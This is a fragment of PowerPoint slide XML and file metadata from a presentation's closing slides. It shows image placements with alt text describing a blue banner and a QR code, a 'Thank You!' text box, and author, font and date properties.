        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2329695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5DCF5-0964-8C4E-F308-EFA10395A750}"/>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BA53BE49-02A0-BDC8-F080-1CF5BC4DB6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blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D5FC112-510E-3D36-C100-051ED4FA7E3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38732322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screenshot of a qr code&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E1C186A-1374-DE76-CF96-C626450BBC74}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="191706" y="437630"/>
            <a:ext cx="5180393" cy="6058940"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B9AFE89B-0E04-50D2-C067-638556279772}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="2781468"/>
            <a:ext cx="4343400" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="6000" b="1" dirty="0"/>
              <a:t>Thank You!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{155784E3-28ED-33E1-D4FA-FA35FF05990B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="979081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2268</TotalTime>
  <Words>2557</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>255</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Aharoni</vt:lpstr>
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Courier New</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Pooja Pawar</dc:creator>
  <cp:lastModifiedBy>Pooja Pawar</cp:lastModifiedBy>
  <cp:revision>35</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-10-01T17:35:55Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-22T06:20:21Z</dcterms:modified>
</cp:coreProperties>
</file>